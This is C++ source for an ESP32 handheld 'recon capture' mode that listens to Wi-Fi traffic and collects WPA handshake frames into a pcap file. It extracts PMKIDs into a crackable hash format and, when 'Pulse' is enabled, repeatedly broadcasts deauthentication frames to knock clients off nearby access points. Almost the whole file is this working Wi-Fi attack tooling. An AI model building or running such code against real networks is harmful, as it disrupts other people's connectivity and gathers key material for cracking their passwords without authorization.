struct ReconTarget {
  uint8_t bssid[6];
  uint8_t mask;
  bool pmkid;
  int8_t rssi;
  uint32_t lastMs;
};

constexpr int kReconSlotBytes = 256;
constexpr int kReconFrameSlots = 24;
constexpr int kReconMaxTargets = 10;
constexpr int kReconVisibleRows = 5;
constexpr uint32_t kReconHopMs = 300;
constexpr uint32_t kReconPulseMs = 2500;
constexpr uint32_t kReconRedrawMs = 450;
static const uint8_t kReconMultiChannels[] = {1, 6, 11};

struct ReconFrame {
  uint8_t data[kReconSlotBytes];
  uint16_t len;
  uint16_t origLen;
  int8_t rssi;
  uint32_t tsSec;
  uint32_t tsUsec;
};

static volatile ReconFrame rcFrameQ[kReconFrameSlots];
static volatile int rcFrameHead = 0;
static volatile int rcFrameTail = 0;

static ReconTarget rcTargets[kReconMaxTargets];
static int rcTargetCount = 0;
static int rcMode = 0;
static bool rcPulse = false;
static bool rcActive = false;
static int rcHopIdx = 0;
static uint32_t lastReconHopMs = 0;
static uint32_t lastReconPulseMs = 0;
static uint32_t lastReconDrawMs = 0;

static File reconPcapFile;
static bool reconPcapOpen = false;
static uint32_t reconPcapFrames = 0;
static uint32_t reconPmkidLines = 0;

void reconCaptureCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* packet = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* payload = packet->payload;
  const int length = packet->rx_ctrl.sig_len;
  if (length < 24) return;
  const uint8_t frameControl = payload[0];
  if (((frameControl >> 2) & 0x03) != 0x02) return;
  int header = 24;
  const uint8_t subtype = (frameControl >> 4) & 0x0F;
  if (subtype & 0x08) header += 2;
  const uint8_t frameControl1 = payload[1];
  const bool toDs = frameControl1 & 0x01;
  const bool fromDs = frameControl1 & 0x02;
  if (toDs && fromDs) header += 6;
  if (length < header + 8) return;
  const uint8_t* llc = payload + header;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[6] == 0x88 && llc[7] == 0x8E))
    return;

  const int next = (rcFrameHead + 1) % kReconFrameSlots;
  if (next == rcFrameTail) return;
  const int copyLen = length > kReconSlotBytes ? kReconSlotBytes : length;
  for (int i = 0; i < copyLen; ++i) rcFrameQ[rcFrameHead].data[i] = payload[i];
  rcFrameQ[rcFrameHead].len = (uint16_t)copyLen;
  rcFrameQ[rcFrameHead].origLen = (uint16_t)length;
  rcFrameQ[rcFrameHead].rssi = packet->rx_ctrl.rssi;
  const uint32_t nowUs = micros();
  rcFrameQ[rcFrameHead].tsSec = nowUs / 1000000UL;
  rcFrameQ[rcFrameHead].tsUsec = nowUs % 1000000UL;
  rcFrameHead = next;
}

static void openReconPcap() {
  reconPcapOpen = false;
  reconPcapFrames = 0;
  reconPmkidLines = 0;
  if (!ensureSdCard()) return;
  reconPcapFile = SD.open("/awokxdag/recon_capture.pcap", FILE_WRITE);
  if (!reconPcapFile) return;
  writePcapLe32(reconPcapFile, 0xA1B2C3D4);
  writePcapLe16(reconPcapFile, 2);
  writePcapLe16(reconPcapFile, 4);
  writePcapLe32(reconPcapFile, 0);
  writePcapLe32(reconPcapFile, 0);
  writePcapLe32(reconPcapFile, kReconSlotBytes);
  writePcapLe32(reconPcapFile, 105);
  reconPcapFile.flush();
  reconPcapOpen = true;
}

static void closeReconPcap() {
  if (reconPcapOpen) {
    reconPcapFile.close();
    reconPcapOpen = false;
  }
}

static void rcResolveSsid(const uint8_t* bssid, char* out, int outLen) {
  uint8_t mac[6];
  for (int i = 0; i < wifiCount; ++i) {
    if (parseBssid(wifiEntries[i].bssid, mac)) {
      bool same = true;
      for (int j = 0; j < 6; ++j)
        if (mac[j] != bssid[j]) { same = false; break; }
      if (same && wifiEntries[i].ssid.length()) {
        strncpy(out, wifiEntries[i].ssid.c_str(), outLen - 1);
        out[outLen - 1] = 0;
        return;
      }
    }
  }
  snprintf(out, outLen, "%02X%02X%02X", bssid[3], bssid[4], bssid[5]);
}

static void writeReconPmkid(const uint8_t* ap, const uint8_t* sta, const uint8_t* pmkid) {
  if (!ensureSdCard()) return;
  File f = SD.open("/awokxdag/recon_pmkid.txt", FILE_APPEND);
  if (!f) return;
  char ssid[34];
  rcResolveSsid(ap, ssid, sizeof(ssid));
  f.print("WPA*01*");
  for (int i = 0; i < 16; ++i) f.printf("%02x", pmkid[i]);
  f.print('*');
  for (int i = 0; i < 6; ++i) f.printf("%02x", ap[i]);
  f.print('*');
  for (int i = 0; i < 6; ++i) f.printf("%02x", sta[i]);
  f.print('*');
  for (size_t i = 0; ssid[i]; ++i) f.printf("%02x", (uint8_t)ssid[i]);
  f.println("***");
  f.close();
  ++reconPmkidLines;
}

static int rcFindOrAdd(const uint8_t* bssid) {
  for (int i = 0; i < rcTargetCount; ++i) {
    bool same = true;
    for (int j = 0; j < 6; ++j)
      if (rcTargets[i].bssid[j] != bssid[j]) { same = false; break; }
    if (same) return i;
  }
  if (rcTargetCount >= kReconMaxTargets) {
    int oldest = 0;
    for (int i = 1; i < rcTargetCount; ++i)
      if (rcTargets[i].lastMs < rcTargets[oldest].lastMs) oldest = i;
    return oldest;
  }
  const int idx = rcTargetCount++;
  for (int j = 0; j < 6; ++j) rcTargets[idx].bssid[j] = bssid[j];
  rcTargets[idx].mask = 0;
  rcTargets[idx].pmkid = false;
  rcTargets[idx].rssi = -127;
  return idx;
}

static void rcWriteFrameToPcap(const ReconFrame& fr) {
  if (!reconPcapOpen) return;
  writePcapLe32(reconPcapFile, fr.tsSec);
  writePcapLe32(reconPcapFile, fr.tsUsec);
  writePcapLe32(reconPcapFile, fr.len);
  writePcapLe32(reconPcapFile, fr.origLen);
  for (int i = 0; i < fr.len; ++i) reconPcapFile.write(fr.data[i]);
  reconPcapFile.flush();
  ++reconPcapFrames;
}

static void rcProcessFrame(const ReconFrame& fr) {
  const uint8_t* d = fr.data;
  const int length = fr.len;
  const uint8_t frameControl = d[0];
  int header = 24;
  const uint8_t subtype = (frameControl >> 4) & 0x0F;
  if (subtype & 0x08) header += 2;
  const uint8_t frameControl1 = d[1];
  const bool fromDs = frameControl1 & 0x02;
  if ((frameControl1 & 0x03) == 0x03) header += 6;
  const uint8_t* bssid = fromDs ? d + 10 : d + 4;
  const int llcEnd = header + 8;
  const int keyInfoOffset = llcEnd + 1 + 1 + 2 + 1;
  if (length < keyInfoOffset + 2) { rcWriteFrameToPcap(fr); return; }
  const uint16_t keyInfo = (d[keyInfoOffset] << 8) | d[keyInfoOffset + 1];
  const bool pairwise = keyInfo & 0x0008;
  if (!pairwise) { rcWriteFrameToPcap(fr); return; }
  const bool install = keyInfo & 0x0040;
  const bool ack = keyInfo & 0x0080;
  const bool mic = keyInfo & 0x0100;
  const bool secure = keyInfo & 0x0200;
  uint8_t bits = 0;
  if (ack && !mic && !install) bits = 0x01;
  else if (mic && !ack && !secure) bits = 0x02;
  else if (mic && ack && install) bits = 0x04;
  else if (mic && secure && !ack) bits = 0x08;

  const int idx = rcFindOrAdd(bssid);
  rcTargets[idx].mask |= (bits & 0x0F);
  rcTargets[idx].rssi = fr.rssi;
  rcTargets[idx].lastMs = millis();

  const int scanEnd = length < llcEnd + 220 ? length : llcEnd + 220;
  for (int i = llcEnd; i + 20 <= scanEnd; ++i) {
    if (d[i] == 0x00 && d[i + 1] == 0x0F && d[i + 2] == 0xAC && d[i + 3] == 0x04) {
      if (!rcTargets[idx].pmkid) {
        const uint8_t* sta = fromDs ? d + 4 : d + 10;
        writeReconPmkid(bssid, sta, d + i + 4);
      }
      rcTargets[idx].pmkid = true;
      break;
    }
  }
  rcWriteFrameToPcap(fr);
}

static void rcDrain() {
  while (rcFrameTail != rcFrameHead) {
    const int t = rcFrameTail;
    ReconFrame fr;
    fr.len = rcFrameQ[t].len;
    fr.origLen = rcFrameQ[t].origLen;
    fr.rssi = rcFrameQ[t].rssi;
    fr.tsSec = rcFrameQ[t].tsSec;
    fr.tsUsec = rcFrameQ[t].tsUsec;
    for (int i = 0; i < fr.len; ++i) fr.data[i] = rcFrameQ[t].data[i];
    rcFrameTail = (t + 1) % kReconFrameSlots;
    rcProcessFrame(fr);
  }
}

static void rcSendPulse() {
  static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t frame[26];
  for (int i = 0; i < rcTargetCount; ++i) {
    if ((rcTargets[i].mask & 0x0F) == 0x0F) continue;
    buildDeauthFrame(frame, broadcast, rcTargets[i].bssid, 0xC0);
    for (int k = 0; k < 2; ++k)
      esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  }
}

static const char* rcModeLabel(int m) {
  return m == 0 ? "HOP all" : m == 1 ? "1 ch" : "multi";
}

void drawReconCapture() {
  currentView = View::kReconCapture;
  display.fillScreen(kBackground);
  char sub[22];
  snprintf(sub, sizeof(sub), "saved %lu", (unsigned long)reconPcapFrames);
  drawHeader("RECON", rcActive ? sub : "idle");

  const int pillY = 46;
  const int pillW = 74;
  for (int m = 0; m < 3; ++m) {
    const int px = 6 + m * (pillW + 2);
    const bool on = (m == rcMode);
    display.drawRect(px, pillY, pillW, 20, on ? kAccent : 0x18E3);
    display.setTextSize(1);
    display.setTextColor(on ? kAccent : kMuted, kBackground);
    display.setCursor(px + 8, pillY + 6);
    display.print(rcModeLabel(m));
  }

  int y = 76;
  const int shown = rcTargetCount < kReconVisibleRows ? rcTargetCount : kReconVisibleRows;
  for (int r = 0; r < shown; ++r) {
    const ReconTarget& t = rcTargets[r];
    char ssid[18];
    rcResolveSsid(t.bssid, ssid, sizeof(ssid));
    display.setTextSize(1);
    display.setTextColor(kForeground, kBackground);
    display.setCursor(8, y);
    display.print(ssid);
    if (rcPulse && (t.mask & 0x0F) != 0x0F) {
      display.setTextColor(kBad, kBackground);
      display.setCursor(150, y);
      display.print("PULSE");
    }
    for (int m = 0; m < 4; ++m) {
      const bool got = t.mask & (1 << m);
      const int dx = 8 + m * 18;
      display.fillCircle(dx + 4, y + 20, 6, got ? kGood : 0x2104);
      display.setTextColor(got ? kBackground : kMuted, got ? kGood : kBackground);
      display.setCursor(dx + 1, y + 16);
      display.printf("%d", m + 1);
    }
    display.setTextColor(t.pmkid ? kGood : kMuted, kBackground);
    display.setCursor(96, y + 16);
    display.print(t.pmkid ? "PMKID+" : "PMKID");
    display.setTextColor(kMuted, kBackground);
    display.setCursor(176, y + 16);
    display.printf("%d", t.rssi);
    y += 38;
  }

  if (rcTargetCount == 0) {
    display.setTextColor(kMuted, kBackground);
    display.setCursor(40, 150);
    display.print("Listening for EAPOL...");
  }

  drawThreeButtonFooter("Mode", rcPulse ? "Pulse*" : "Pulse", "Back");
}

void reconCaptureCycleMode() {
  rcMode = (rcMode + 1) % 3;
  rcHopIdx = 0;
}

void reconCaptureTogglePulse() {
  if (!rcPulse) {
    if (!confirmActiveTest("Recon pulse")) {
      drawReconCapture();
      return;
    }
  }
  rcPulse = !rcPulse;
}

void startReconCapture() {
  if (!stopActiveTools()) return;
  rcTargetCount = 0;
  rcFrameHead = 0;
  rcFrameTail = 0;
  rcMode = 0;
  rcPulse = false;
  rcHopIdx = 0;
  lastReconHopMs = millis();
  lastReconPulseMs = millis();
  lastReconDrawMs = 0;
  signalMonitorActive = false;
  openReconPcap();

  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&reconCaptureCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(kDeauthHopChannels[0], WIFI_SECOND_CHAN_NONE);
  rcActive = true;
  currentView = View::kReconCapture;
  drawReconCapture();
}

void stopReconCapture() {
  if (!rcActive) return;
  rcActive = false;
  rcPulse = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  closeReconPcap();
}

void updateReconCapture() {
  if (currentView != View::kReconCapture || !rcActive) return;
  const uint32_t now = millis();
  rcDrain();

  if (rcMode != 1 && now - lastReconHopMs >= kReconHopMs) {
    lastReconHopMs = now;
    uint8_t ch;
    if (rcMode == 2) {
      rcHopIdx = (rcHopIdx + 1) % (int)(sizeof(kReconMultiChannels));
      ch = kReconMultiChannels[rcHopIdx];
    } else {
      rcHopIdx = (rcHopIdx + 1) % kDeauthHopChannelCount;
      ch = kDeauthHopChannels[rcHopIdx];
    }
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }

  if (rcPulse && now - lastReconPulseMs >= kReconPulseMs) {
    lastReconPulseMs = now;
    rcSendPulse();
  }

  if (now - lastReconDrawMs >= kReconRedrawMs) {
    lastReconDrawMs = now;
    drawReconCapture();
  }
}

void reconCaptureTouch(int x) {
  if (x < kScreenWidth / 3) {
    reconCaptureCycleMode();
    drawReconCapture();
  } else if (x < (kScreenWidth * 2) / 3) {
    reconCaptureTogglePulse();
    drawReconCapture();
  } else {
    stopReconCapture();
    drawReconMenu();
  }
}
